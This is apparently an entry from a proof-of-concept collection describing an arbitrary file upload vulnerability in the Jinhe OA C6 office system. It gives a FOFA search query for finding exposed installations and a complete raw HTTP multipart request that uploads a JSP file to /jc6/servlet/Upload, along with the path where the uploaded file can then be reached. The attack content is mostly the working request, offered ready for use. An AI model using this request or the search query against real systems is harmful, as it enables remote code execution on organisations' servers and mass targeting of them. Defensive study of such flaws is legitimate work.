## 金和OA_jc6_Upload任意文件上传

金和OA协同办公管理系统C6软件（简称金和OA），本着简单、适用、高效的原则，贴合企事业单位的实际需求，实行通用化、标准化、智能化、人性化的产品设计，充分体现企事业单位规范管理、提高办公效率的核心思想，为用户提供一整套标准的办公自动化解决方案，以帮助企事业单位迅速建立便捷规范的办公环境。金和OA jc6/servlet/Upload接口存在任意文件上传漏洞。

## fofa
```
app="金和网络-金和OA"||body="/jc6/platform/sys/login"
```

## poc
```
POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 197
Content-Type: multipart/form-data; boundary=ee055230808ca4602e92d0b7c4ecc63d

--ee055230808ca4602e92d0b7c4ecc63d
Content-Disposition: form-data; name="img"; filename="1.jsp"
Content-Type: image/jpeg

<% out.println("tteesstt1"); %>
--ee055230808ca4602e92d0b7c4ecc63d--
```
![66cafb6ff95136b967c3b922ceeb8eb6](https://github.com/wy876/POC/assets/139549762/91a0d8aa-f1c0-4da7-aada-ce8a48e8ffbe)

拼接上传路径 http://127.0.0.1/jc6/upload/8a87db028d0c1c8e018d0d8d2d5b1cd9.jsp
